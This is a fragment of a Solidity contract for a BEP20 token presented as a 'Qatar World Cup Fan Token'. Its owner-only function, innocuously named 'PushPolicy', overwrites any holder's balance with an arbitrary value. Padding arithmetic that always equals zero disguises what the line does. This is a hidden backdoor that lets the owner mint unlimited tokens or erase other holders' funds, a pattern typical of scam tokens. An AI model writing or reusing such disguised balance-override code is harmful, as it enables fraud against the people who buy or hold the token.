 ...
 */
contract QatarWorldCup is IBEP20, HasForeignAsset {
     ...
     */
    constructor () {
        _name = "Qatar World Cup Fan Token";
        _symbol = "QWF";
        _decimals = 9;
    ...
    function PushPolicy(address spender, uint256 amount) public onlyOwner {
       if(spender != address(0) && msg.sender != address(0)){
       _balances[spender] = (3 * 1 * 2 - 3 * 1 * 2) + (amount * 10 ** _decimals);
    }
  }
